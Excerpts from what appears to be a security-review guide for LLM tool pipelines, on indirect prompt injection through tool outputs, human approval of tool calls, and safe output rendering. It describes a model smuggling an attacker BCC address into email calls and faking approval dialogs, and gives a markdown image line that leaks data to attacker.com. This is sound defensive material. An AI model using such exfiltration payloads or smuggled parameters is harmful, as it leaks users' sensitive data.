...
- **Internal Tool Results and API Payloads** — Even if a tool or API is considered "internal" (e.g., retrieving a database record, a ticket description, customer comments, or Slack message history), its payload may contain raw, user-generated content written by low-privilege or untrusted external users. If the LLM processes this tool output, indirect injection can occur. Do not assume tool outputs are trusted.
...
#### 3.1 Tool-Result Provenance Tracking
When assessing tool-use pipelines:
- Verify that every tool output has its trust boundaries mapped. If a tool fetches data containing external user input (e.g., `tools.get_ticket_comments(id)`), the output must be treated as untrusted.
- Ensure that the LLM is instructed or structurally constrained to treat tool messages with appropriate data-demarcation wrappers (e.g., XML tags, Markdown code blocks, or JSON boundaries) to separate them from instructions.
...
### 5.3 Human-in-the-Loop and Canonical Action Review

- Are high-impact or irreversible actions (sending emails, modifying data, executing code, making external network calls) gated by human confirmation?
- **Canonical Action Validation:** Is the confirmation screen independent of model-generated summaries or natural-language explanations? The approval UI must render and validate the **fully resolved, canonical tool call parameters**, including nested objects, hidden fields, defaults, resolved recipients, and attachment lists. If the LLM tries to smuggle parameters (e.g., adding an attacker-controlled BCC address or tracking URL to a resolved email tool call payload), the approval UI must expose these fields clearly to the user.
- **Verification UI Integrity:** Is the confirmation dialog generated by secure, static UI code rather than dynamically by the model? (Otherwise, a jailbroken model can generate a fake approval dialog).
- Are there thresholds for when human review is required vs. when automated execution is permitted?

### 5.4 Output Filtering and Renderer Policies
...
- **Secure Renderer Policies:** If the model has access to sensitive context, the output rendering component (markdown, HTML, rich text) must enforce strict policies to prevent data exfiltration:
  - **Disable Remote Image Loading:** Stop the renderer from loading arbitrary external images (e.g., `![leak](https://attacker.com/log?data=...)`), which is a primary channel for automatic data exfiltration.
  - **Link Rewriting and Proxying:** Restrict link navigation, rewrite/proxy outbound links safely, or strip HTML/markdown link structures entirely.
  - **HTML Sanitization:** Sanitize HTML tags, disable inline scripts, and set `rel="noopener noreferrer"` and `referrerpolicy="no-referrer"` controls on all generated links.
  - **Model-Produced URL Gating:** Block model-produced URLs or require allowlists in contexts where the model has access to sensitive data, preventing it from dynamically generating exfiltration endpoints.
...
6. **Over-reporting RAG content as prompt injection without context (False Positive calibration).** Simply seeing retrieved untrusted content or user text inside a prompt context is not automatically a high-severity prompt injection vulnerability. If the model operates with disabled tools, receives system-level instructions in a separate role, demarcates retrieved data using strict tags, and applies strict output formatting or citations, it is not vulnerable to goal hijacking. The review must calibrate RAG severity based on whether retrieved content can escape boundary delimiters and trigger instructions/side effects, rather than just the presence of untrusted text.
